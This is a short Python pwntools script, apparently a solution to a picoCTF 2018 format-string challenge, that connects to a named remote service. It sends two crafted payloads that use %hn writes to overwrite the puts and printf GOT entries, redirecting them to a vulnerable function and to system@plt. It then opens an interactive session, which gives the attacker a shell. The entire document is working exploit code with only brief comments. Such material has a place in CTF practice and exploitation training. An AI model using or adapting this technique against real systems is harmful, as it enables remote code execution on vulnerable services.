from pwn import *

vuln_addr = 0x080485ab
sys_plt   = 0x08048460
print_got = 0x804a010
puts_got  = 0x804a01c

r = remote('2018shell3.picoctf.com', 22462)

payload  = p32(puts_got)
payload += p32(puts_got+2)
payload += '%' + str((vuln_addr & 0xffff) - 0x8) + 'c' # p32(puts_got) + p32(puts_got) takes 8 bytes
payload += '%7$hn' # by calling convention we know p32(puts_got) is at 7 parameters, which is also the same place with esp 
payload += '%' + str(0x10000 + (vuln_addr >> 16) - vuln_addr & 0xffff) + 'c'
payload += '%8$hn'

r.sendafter(':', payload)

payload  = p32(print_got)
payload += p32(print_got+2)
payload += '%' + str((sys_plt & 0xffff) - 0x8) + 'c'
payload += '%7$hn'
payload += '%' + str(0x10000 + (sys_plt >> 16) - sys_plt & 0xffff) + 'c'
payload += '%8$hn'

r.sendafter(':', payload)

r.interactive()

